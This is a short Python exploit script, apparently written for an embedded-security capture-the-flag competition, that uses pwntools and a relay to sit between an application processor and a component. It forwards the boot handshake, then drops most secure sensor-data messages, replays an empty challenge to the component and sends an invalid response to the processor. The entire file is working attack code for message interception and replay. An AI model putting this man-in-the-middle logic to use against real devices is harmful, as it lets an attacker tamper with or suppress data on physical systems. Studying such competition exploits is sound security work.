import sys
sys.path.append('../relay')

from pwn import *
from relay import Relay, CompRelay

def hide_forward_to_comp(relay):
    relay.forward_to_comp()
    relay.forward_to_ap()
    relay.forward_to_comp()

def hide_forward_to_ap(relay):
    relay.forward_to_ap()
    relay.forward_to_comp()
    relay.forward_to_ap()

challenge_replay = b''
invalid_request = b'\xff' * 0x80

def drop_comp_to_ap_secure_message(relay):
    # drop component message
    component_message = relay.recv_from_comp()
    relay.send_to_comp(challenge_replay)
    relay.recv_from_comp()

    # send back component invalid challenge response
    relay.send_to_ap(invalid_request)
    
# put your exploit code in this function
def exploit():
    relay = Relay(0x1111125)

    # forward boot ping
    hide_forward_to_comp(relay)
    # forward boot pong
    hide_forward_to_ap(relay)
    # forward boot confirm
    hide_forward_to_comp(relay)
    # forward boot message
    hide_forward_to_ap(relay)

    # at this point design should be booted

    # ap will ask component if it is sensor or pump
    hide_forward_to_comp(relay)
    hide_forward_to_ap(relay)

    # now ap will poll for data, and component will reply
    i = 0
    while True:
        # forward message teling component we want sensore data
        hide_forward_to_comp(relay)
        # temp index
        if (i % 10) != 4:
            # drop packet
            drop_comp_to_ap_secure_message(relay)
        else:
            hide_forward_to_ap(relay)

        i += 1

if __name__ == "__main__":
    exploit()
